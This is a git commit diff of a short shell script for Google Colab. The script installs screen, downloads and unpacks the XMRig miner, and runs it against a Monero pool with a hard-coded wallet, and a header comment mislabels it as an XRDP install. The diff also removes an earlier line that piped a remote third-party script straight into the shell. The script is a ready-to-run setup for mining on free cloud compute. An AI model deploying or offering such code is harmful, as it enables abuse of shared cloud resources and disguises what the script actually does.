d7f8cccb38e5910811e4d5102f1ffb4ebf0a7a13
zacky11 <114376753+zacky11@users.noreply.github.com>
2022-09-26 11:39:47 +0700

    Add files via upload

--- file.sh
+++ file.sh
@@ -1,2 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
 screen -R xmr
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-sg.sh | sh
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+./xmrig -o us-west.minexmr.com:443 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls --rig-id GC-US
